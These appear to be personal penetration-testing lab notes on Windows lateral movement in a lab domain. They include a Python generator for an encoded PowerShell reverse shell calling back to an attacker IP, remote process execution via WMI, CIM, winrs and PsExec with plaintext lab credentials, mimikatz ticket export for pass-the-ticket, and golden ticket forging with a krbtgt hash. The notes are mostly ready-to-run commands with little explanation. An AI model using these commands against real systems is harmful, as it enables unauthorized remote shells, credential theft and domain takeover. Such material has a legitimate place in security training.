
# WMI and WinRM

we can start any process with this command in cmd
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

![[Pasted image 20240521175413.png]]

### PS revshell

to get revshell we need to make powershell reverse shell with below python script

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.201",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

![[Pasted image 20240521175537.png]]

Then start running below command from powershell

```
$username = 'jen';

$password = 'Nexus123!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM

$Session = New-Cimsession -ComputerName 192.168.162.72 -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e '; 

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

and you get a shell in your listener

![[Pasted image 20240521175757.png]]

![[Pasted image 20240521175806.png]]

### WinRM

```
winrs -r:web04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e " 
```

this will also give same result as above



# PsExec

Three conditions:

1. the user that authenticates to the target machine needs to be part of the Administrators local group.
2. ADMIN$ share must be available
3. File and Printer Sharing has to be turned on

```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```



# Pass the Ticket (PtT)

verify that we don't have access

![[Pasted image 20240521195915.png]]

mimikatz to export all tickets

```
privilege::debug

sekurlsa::tickets /export
```

![[Pasted image 20240521200336.png]]

check kirbi files

```
dir *.kirbi
```

![[Pasted image 20240521200405.png]]

choose the ticket of which user you want
(try different tickets if one not succeed)
also ticket is valid for that prompt only not any other powershell or cmd session

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

cached - list ticket

```
klist
```

got access - YAY!!

![[Pasted image 20240521201100.png]]

# Golden ticket

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

only when we have **krbtgt NTLM**

```
privilege::debug

kerberos::purge

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

misc::cmd


PsExec.exe \\dc1 cmd.exe
```

![[Pasted image 20240521233213.png]]

open new session with PsExec

whoami /user --> for SID
also Get-ADDomain module
